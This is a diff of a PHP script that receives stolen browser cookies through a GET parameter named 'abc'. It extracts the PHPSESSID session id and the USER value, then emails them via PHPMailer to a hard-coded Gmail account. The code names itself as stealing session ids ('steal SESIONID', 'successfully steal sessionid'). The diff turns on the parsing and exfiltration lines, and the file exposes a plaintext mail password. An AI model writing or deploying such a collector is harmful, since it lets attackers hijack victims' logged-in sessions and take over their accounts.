@@ -4,16 +4,16 @@ include 'PHPMailer/class.phpmailer.php';
 
 if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
-//     $sessionid = "";
-//     $user = "";
-//     $arr = explode(";", $cookie);
-//     $arrlength = count($arr);
-//     for ($x = 0; $x < $arrlength; $x++){
-//         if (strpos($arr[$x], "PHPSESSID"))
-//             $sessionid = explode("=", $arr[$x])[1];
-//         if (strpos($arr[$x], "USER"))
-//             $user = explode("=", $arr[$x])[1];
-//     }
+    $sessionid = "";
+    $user = "";
+    $arr = explode(";", $cookie);
+    $arrlength = count($arr);
+    for ($x = 0; $x < $arrlength; $x++){
+        if (strpos($arr[$x], "PHPSESSID"))
+            $sessionid = explode("=", $arr[$x])[1];
+        if (strpos($arr[$x], "USER"))
+            $user = explode("=", $arr[$x])[1];
+    }
         
 
 
@@ -30,8 +30,8 @@ if (isset($_GET["abc"])) {
     $mail->Password = '102102102';
     $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
     $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
-    $mail->Subject = 'successfully steal sessionid';
-  //  $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
+  //  $mail->Subject = 'successfully steal sessionid';
+    $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
      $mail->MsgHTML("ok");
     $mail->AddAddress('ahbcgd590@gmail.com', 'me');
     
